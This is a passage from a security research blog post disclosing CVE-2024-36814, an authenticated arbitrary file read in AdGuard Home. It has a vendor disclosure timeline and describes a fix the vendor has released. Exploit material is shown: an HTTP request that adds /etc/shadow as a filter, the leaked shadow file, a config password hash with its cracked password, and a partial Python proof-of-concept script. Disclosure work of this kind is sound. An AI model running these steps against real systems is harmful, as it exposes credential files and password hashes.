up as a low privileged user and bind to any privileged port. Although there seems to be a lot of arguments for and against this so ¯\\(ツ)/¯ Disclosure timeline 05/04/2024: Adguard Home Authenticated Arbitrary File Read Discovered 06/04/2024: Adguard Home Authenticated Arbitrary File Read Disclosed 07/04/2024: Vendor acknowledges receipt of the disclosure 24/04/2024: Vendor validates vulnerability disclosure and requests extended time frame to fix 24/05/2024: Applied for MITRE CVE (with permission from the Adguard Home team) 12/06/2024: Vendor provides fix for feedback 08/06/2024: CVE-2024-36814 reserved 05/07/2024: Tested vendor fix 09/07/2024: Vendor asked for an extension due to windows causing issues 04/10/2024: Vendor releases 0.107.53 with patch for linux and mitigation for windows 07/10/2024: Blog Post released Reporters Jack Moran (itz-d0dgy)","headline":"CVE-2024-36814 - Adguard Home Arbitrary File Read","mainEntityOfPage":{"@type":"WebPage","@id":"https://happy-little-accidents.pages.dev/posts/CVE-2024-36814/"},"url":"https://happy-little-accidents.pages.dev/posts/CVE-2024-36814/"}</script>
<!-- End Jekyll SEO tag -->


  <title>CVE-2024-36814 - Adguard Home Arbitrary File Read | Happy Little Accidents!
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Happy Little Accidents!">
<meta name="application-name" content="Happy Little Accidents!">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.27.20/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- JavaScript -->

  
    <!-- Switch the mode between dark and light. -->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() {
      return 'mode';
    }
    static get MODE_ATTR() {
      return 'data-mode';
    }
    static get DARK_MODE() {
      return 'dark';
    }
    static get LIGHT_MODE() {
      return 'light';
    }
    static get ID() {
      return 'mode-toggle';
    }

    constructor() {
      let self = this;this.sysDarkPrefers.addEventListener('change', () => {
        if (self.hasMode) {
          self.clearMode();
        }
        self.notify();
      });

      if (!this.hasMode) {
        return;
      }

      if (this.isDarkMode) {
        this.setDark();
      } else {
        this.setLight();
      }
    }

    get sysDarkPrefers() {
      return window.matchMedia('(prefers-color-scheme: dark)');
    }

    get isPreferDark() {
      return this.sysDarkPrefers.matches;
    }

    get isDarkMode() {
      return this.mode === ModeToggle.DARK_MODE;
    }

    get hasMode() {
      return this.mode != null;
    }

    get mode() {
      return sessionStorage.getItem(ModeToggle.MODE_KEY);
    }get modeStatus() {
      if (this.hasMode) {
        return this.mode;
      } else {
        return this.isPreferDark ? ModeToggle.DARK_MODE : ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      document.documentElement.removeAttribute(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }notify() {
      window.postMessage(
        {
          direction: ModeToggle.ID,
          message: this.modeStatus
        },
        '*'
      );
    }

    flipMode() {
      if (this.hasMode) {
        this.clearMode();
      } else {
        if (this.isPreferDark) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.notify();
    }
  }

  const modeToggle = new ModeToggle();
</script>

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/commons/HappyLittleAccidents.webp" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">Happy Little Accidents!</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Research blog for the Accidents team</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
    

    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>CVE-2024-36814 - Adguard Home Arbitrary File Read</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>CVE-2024-36814 - Adguard Home Arbitrary File Read</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1728248400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Oct  6, 2024
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                Jack Moran (itz-d0dgy)
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1648 words"
>
  <em>9 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  <div class="content">
    <h1 id="adguard-home-arbitrary-file-read">Adguard Home Arbitrary File Read</h1>
<p>TL;DR - Adguard Home deployments using versions <code class="language-plaintext highlighter-rouge">0.107.52</code> or lower are vulnerable to Arbitrary File Read which allowed a local authenticated user to target privileged files as a custom filter. This will read the contents of the file and write it to a world-readable file elsewhere on the underlying host. Did someone say <code class="language-plaintext highlighter-rouge">/etc/shadow</code>?</p>

<h1 id="shoutout">Shoutout</h1>
<p>We want to start by giving a huge shoutout to the Adguard Home team (particularly Ainar!). Adguard Home was receptive of the issue, and their communication, responsiveness and willingness to collaborate made all the difference. We truly appreciated it!</p>

<h1 id="technical-details">Technical details</h1>
<h2 id="what-is-it"><span class="me-2">What is it?</span><a href="#what-is-it" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>AdGuard Home is a network-wide solution for blocking ads and tracking. It’s a great alternative to things like <a href="https://github.com/pi-hole/pi-hole">PiHole</a>. The usage model is that users can set up and deploy Adguard Home within their network and start blocking ads network-wide. It operates as a DNS server that re-routes tracking domains to a “black hole”, thus preventing your devices from connecting to those servers.</p>

<h2 id="what-was-wrong"><span class="me-2">What was wrong?</span><a href="#what-was-wrong" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>When interacting with Adguard Home we found that it allowed users to define custom filter lists to enhance their ad-blocking. This feature enables users to tailor their experience by adding specific filters that suit their needs, whether blocking particular domains, ads, or trackers. These custom filters can be provided by the user via a URL or an absolute file path. You can see where we are going… If you can’t,  that’s all good, come along for the ride!</p>

<p>Adguard Home has two categories of installation methods, which are “Automated install” and “Alternative methods”. So for the purpose of this blog, we will focus on the “Automated install”, which has an installation script that can be downloaded <a href="https://raw.githubusercontent.com/AdguardTeam/AdGuardHome/master/scripts/install.sh">here</a>. This script, when run using one of the provided commands (in my case I will be using curl: <code class="language-plaintext highlighter-rouge">curl -s -S -L https://raw.githubusercontent.com/AdguardTeam/AdGuardHome/master/scripts/install.sh | sh -s -- -v</code>) requires root permissions to configure and install Adguard Home. Presumably, this is for ease of use for the end user installing Adguard Home, and to run the Adguard DNS server on port 53, which is considered a “privileged port”.</p>

<p>The following snippet is from the aforementioned script which checks if it has been run as root in the <code class="language-plaintext highlighter-rouge">is_root()</code> function, note the comment that states ‘note that AdGuard Home requires root privileges to install using this script’:</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="c"># Function is_root checks for root privileges to be granted.</span>
is_root<span class="o">()</span> <span class="o">{</span>
  <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="si">$(</span> <span class="nb">id</span> <span class="nt">-u</span> <span class="si">)</span><span class="s2">"</span> <span class="nt">-eq</span> <span class="s1">'0'</span> <span class="o">]</span>
    <span class="k">then
      </span>log <span class="s1">'script is executed with root privileges'</span>
      <span class="k">return </span>0
  <span class="k">fi

  if </span>is_command <span class="s2">"</span><span class="nv">$sudo_cmd</span><span class="s2">"</span>
    <span class="k">then
      </span>log <span class="s1">'note that AdGuard Home requires root privileges to install using this script'</span>
      <span class="k">return </span>1
  <span class="k">fi
  </span>error_exit <span class="se">\</span>
  <span class="s1">'root privileges are required to install AdGuard Home using this script
   please, restart it with root privileges'</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Upon completion of the installation process, the Adguard Home service is installed, and a web server is set up waiting for the user to start and complete the setup process. Once completed, Adguard Home writes a yaml file called <code class="language-plaintext highlighter-rouge">AdguardHome.yml</code> to the <code class="language-plaintext highlighter-rouge">/opt/AdGuardHome</code> directory, containing all the configuration information required for the Adguard Home service. Interestingly enough this file is written with <code class="language-plaintext highlighter-rouge">-rw-r--r--</code> permissions, indicating anyone can read its contents. This is shown by the following <code class="language-plaintext highlighter-rouge">ls -la</code> command output:</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>itz-d0dgy㉿fuji-xerox<span class="o">)</span>-[/opt/AdGuardHome]
└─<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 29904
drwxrwxrwx 3 root root     4096 Jul 30 21:12 <span class="nb">.</span>
drwxr-xr-x 3 root root     4096 Jul 30 21:12 ..
<span class="nt">-rwxrwxrwx</span> 1 root root 30417048 Jul  5 03:44 AdGuardHome
<span class="nt">-rw-rw-rw-</span> 1 root root      566 Jul  5 03:44 AdGuardHome.sig
<span class="nt">-rw-r--r--</span> 1 root root     3665 Jul 30 21:12 AdGuardHome.yaml
<span class="nt">-rw-r--r--</span> 1 root root   117539 Jul  5 03:44 CHANGELOG.md
<span class="nt">-rw-r--r--</span> 1 root root    35149 Jul  5 03:44 LICENSE.txt
<span class="nt">-rw-r--r--</span> 1 root root    21812 Jul  5 03:44 README.md
drwxr-xr-x 3 root root     4096 Jul 30 21:12 data
</pre></td></tr></tbody></table></code></div></div>

<p>It also looks like someone could also replace the <code class="language-plaintext highlighter-rouge">AdGuardHome</code> binary due to the <code class="language-plaintext highlighter-rouge">-rwxrwxrwx</code> permissions. Which was later confirmed by <a href="https://github.com/go-compile">go-compiles</a> <a href="https://github.com/advisories/GHSA-7jp9-vgmq-c8r5">CVE</a>, go check it out!</p>

<p>When running <code class="language-plaintext highlighter-rouge">cat</code> on the file we can see that the configuration contains a “users” section, with a username, and a password hash ripe for the taking:</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>itz-d0dgy㉿fuji-xerox<span class="o">)</span>-[/opt/AdGuardHome]
└─<span class="nv">$ </span><span class="nb">cat </span>AdGuardHome.yaml 
<span class="o">[</span>SNIP]

<span class="nb">users</span>:
  - name: admin
    password: <span class="nv">$2a$10$TQfdZeCc66GpyjsRSTO10</span>.Ug2DKVjv8M8WrrHLH6ghsRtoZI84Cyi

<span class="o">[</span>SNIP]
</pre></td></tr></tbody></table></code></div></div>

<p>Now, assuming the user does not have access to the Adguard Home dashboard, they can take this hash and attempt to crack it offline. It may take some time though, as the hash is 10 rounds of bcrypt, and users, especially administrators, tend to use strong passwords… right?</p>

<p><a href="/commons/passwords.webp" class="popup img-link  shimmer"><img src="/commons/passwords.webp" alt="Meme on password stats from 2023" loading="lazy"></a></p>

<p>For the purposes of this blog, we will assume either the user in question already has access to the Adguard Home dashboard or the hash was successfully cracked (<code class="language-plaintext highlighter-rouge">admin1234</code>), resulting in access to the Adguard Home dashboard. As mentioned earlier, Adguard Home allows users to define a custom filter list which can be provided by the user via a URL or an absolute file path. Adding one is as simple as navigating to <code class="language-plaintext highlighter-rouge">/#filters</code>, clicking add block/allow list &gt; add a custom list &gt; and putting in the required URL or absolute file path… say <code class="language-plaintext highlighter-rouge">/etc/shadow</code>. This will result in an HTTP POST request to <code class="language-plaintext highlighter-rouge">/control/filtering/add_url</code>, which looks something like this:</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/control/filtering/add_url</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="s">[SNIP]</span>

{
  "url":"/etc/shadow",
  "name":"test",
  "whitelist":false
}
</pre></td></tr></tbody></table></code></div></div>

<p>And the addition of <code class="language-plaintext highlighter-rouge">/etc/shadow</code> to the DNS blocklists as indicated by the “Rules count” in the screenshot below:</p>

<p><a href="/commons/AdguardFilter.webp" class="popup img-link  shimmer"><img src="/commons/AdguardFilter.webp" alt="Adguard Filters" loading="lazy"></a></p>

<p>But you may be asking yourself… where are my hashes??? Well, do you remember that world-readable directory I mentioned earlier? It has a subdirectory called <code class="language-plaintext highlighter-rouge">data</code> and inside that, a directory called <code class="language-plaintext highlighter-rouge">filters</code>. Let’s take a look inside, shall we?</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>itz-d0dgy㉿fuji-xerox<span class="o">)</span>-[/opt/AdGuardHome]
└─<span class="nv">$ </span><span class="nb">cat </span>data/filters/1722330776.txt 
root:!:19812:0:99999:7:::
daemon:<span class="k">*</span>:19812:0:99999:7:::
bin:<span class="k">*</span>:19812:0:99999:7:::
sys:<span class="k">*</span>:19812:0:99999:7:::
<span class="nb">sync</span>:<span class="k">*</span>:19812:0:99999:7:::
games:<span class="k">*</span>:19812:0:99999:7:::
man:<span class="k">*</span>:19812:0:99999:7:::
lp:<span class="k">*</span>:19812:0:99999:7:::
mail:<span class="k">*</span>:19812:0:99999:7:::
news:<span class="k">*</span>:19812:0:99999:7:::
uucp:<span class="k">*</span>:19812:0:99999:7:::
proxy:<span class="k">*</span>:19812:0:99999:7:::
www-data:<span class="k">*</span>:19812:0:99999:7:::
backup:<span class="k">*</span>:19812:0:99999:7:::
list:<span class="k">*</span>:19812:0:99999:7:::
irc:<span class="k">*</span>:19812:0:99999:7:::
_apt:<span class="k">*</span>:19812:0:99999:7:::
nobody:<span class="k">*</span>:19812:0:99999:7:::
systemd-network:!<span class="k">*</span>:19812::::::
tss:!:19812::::::
systemd-timesync:!<span class="k">*</span>:19812::::::
messagebus:!:19812::::::
usbmux:!:19812::::::
tcpdump:!:19812::::::
sshd:!:19812::::::
dnsmasq:!:19812::::::
avahi:!:19812::::::
speech-dispatcher:!:19812::::::
fwupd-refresh:!<span class="k">*</span>:19812::::::
saned:!:19812::::::
polkitd:!<span class="k">*</span>:19812::::::
rtkit:!:19812::::::
colord:!:19812::::::
Debian-gdm:!:19812::::::
itz-d0dgy:<span class="nv">$y$j9T$I5yv6</span><span class="o">[</span>REDACTED]
</pre></td></tr></tbody></table></code></div></div>

<p>Did Adguard Home, just copy <code class="language-plaintext highlighter-rouge">/etc/shadow</code>? Why… yes, yes it did!</p>

<h2 id="putting-it-all-together"><span class="me-2">Putting it all together!</span><a href="#putting-it-all-together" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Now there are a lot of steps to this, so here is a short clip of my PoC in action written in Python:</p>

<video controls="true" style="width:100%">
  <source src="/commons/adguard_home_poc.webm" type="video/webm" alt="Adguard Home PoC" />
  Your browser does not support the video tag.
</video>

<p>If you want to try it yourself, here is the Python script, I hope it works if you want to try it out (it worked for me 😂):</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">argparse</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">from</span> <span class="n">watchdog.observers</span> <span class="kn">import</span> <span class="n">Observer</span>
<span class="kn">from</span> <span class="n">watchdog.events</span> <span class="kn">import</span> <span class="n">FileSystemEventHandler</span>
<span class="kn">from</span> <span class="n">random</span> <span class="kn">import</span> <span class="n">randrange</span>

<span class="k">def</span> <span class="nf">authenticate</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
  <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">password</span> <span class="p">}</span>
  <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span> <span class="p">}</span>
  <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/control/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

  <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
    <span class="k">return</span> <span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">Set-Cookie</span><span class="sh">"</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Authentication failed: </span><span class="si">{</span><span class="n">response</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">arb_read</span><span class="p">(</span> <span class="nb">file</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">url</span> <span class="p">):</span>
  <span class="n">payload1</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">"</span><span class="s">url</span><span class="sh">"</span><span class="p">:</span><span class="nb">file</span><span class="p">,</span> <span class="sh">"</span><span class="s">whitelist</span><span class="sh">"</span><span class="p">:</span> <span class="bp">False</span> <span class="p">}</span>
  <span class="n">payload2</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">"</span><span class="s">url</span><span class="sh">"</span><span class="p">:</span><span class="nb">file</span><span class="p">,</span> <span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">randrange</span><span class="p">(</span><span class="mi">10000</span><span class="p">)),</span> <span class="sh">"</span><span class="s">whitelist</span><span class="sh">"</span><span class="p">:</span> <span class="bp">False</span> <span class="p">}</span>
  <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Cookie</span><span class="sh">"</span><span class="p">:</span> <span class="n">cookie</span> <span class="p">}</span>
  <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/control/filtering/remove_url</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload1</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
  <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/control/filtering/add_url</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload2</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">setup</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">directory</span><span class="p">,</span> <span class="nb">file</span><span class="p">):</span>
  <span class="k">class</span> <span class="nc">NewFileHandler</span><span class="p">(</span><span class="n">FileSystemEventHandler</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">on_created</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">event</span><span class="p">):</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="n">event</span><span class="p">.</span><span class="n">is_directory</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">New file created: </span><span class="si">{</span><span class="n">event</span><span class="p">.</span><span class="n">src_path</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">file_path</span> <span class="o">=</span> <span class="n">event</span><span class="p">.</span><span class="n">src_path</span>
        <span class="k">try</span><span class="p">:</span>
          <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
            <span class="n">contents</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">File contents:</span><span class="sh">"</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
          <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error reading file: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

